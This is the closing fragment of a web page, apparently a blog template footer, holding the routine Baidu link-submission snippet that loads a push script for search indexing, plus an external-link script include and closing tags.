(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  
  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>


</body>
</html>
